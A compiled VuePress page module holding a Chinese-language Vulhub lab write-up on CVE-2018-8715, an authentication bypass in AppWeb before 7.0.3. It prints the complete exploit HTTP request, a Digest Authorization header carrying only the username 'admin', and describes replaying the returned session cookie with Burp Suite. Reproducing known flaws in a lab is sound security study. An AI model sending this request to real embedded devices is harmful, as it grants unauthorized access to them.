import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as s,c as o,a as e,b as d,d as r,e as i}from"./app-58e4a7d6.js";const c={},l=i('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证</li></ul><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><p>参考链接：</p>',6),p={href:"https://ssd-disclosure.com/index.php/archives/3676",target:"_blank",rel:"noopener noreferrer"},u=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个带有digest认证的Appweb 7.0.1服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>访问<code>http://your-ip:8080</code>，需要输入账号密码。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为<code>admin</code>。</p><p>构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET / HTTP/1.1
Host: 192.168.174.128:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Authorization: Digest username=admin
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211648848.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在Burpsuite→Options→Match and Replace中设置规则，这样在每次发送数据包时将自动在Headers中加入Cookie，添加session到浏览器：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211708588.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>即可正常访问需要认证的页面：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202211716649.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14);function h(m,g){const a=t("ExternalLinkIcon");return s(),o("div",null,[l,e("ul",null,[e("li",null,[e("a",p,[d("https://ssd-disclosure.com/index.php/archives/3676"),r(a)])])]),u])}const f=n(c,[["render",h],["__file","AppWeb认证绕过漏洞 CVE-2018-8715.html.vue"]]);export{f as default};
